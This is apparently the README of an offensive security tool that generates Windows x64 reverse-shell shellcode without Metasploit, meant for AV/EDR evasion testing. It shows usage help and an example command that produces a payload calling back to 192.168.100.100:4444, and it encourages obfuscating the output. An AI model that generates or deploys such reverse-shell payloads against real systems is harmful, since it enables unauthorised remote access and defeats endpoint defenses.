# shell_reverse_tcp
msfvenom windows/x64/shell_reverse_tcp payload generator without dependencies

# Help

```
$ ./shell_reverse_tcp -h
Usage of ./shell_reverse_tcp:
  -host string
        Host IP address (default "127.0.0.1")
  -port int
        Port number (0-65535) (default 4444)
```

## Example

```
$ ./shell_reverse_tcp -host 192.168.100.100 -port 4444 > shellcode.bin
```

# Project spirit
Generate your payload in x64 quickly and easily without dependencies to perform AV/EDR evasion tests on Windows in amd64, so you can use encoders, ciphers, obfuscators, whatever.

# Authors
* [Huerfano](https://www.linkedin.com/in/leonardo-astorga-20b1095a/)
* [Vay3t](https://vay3t.org)
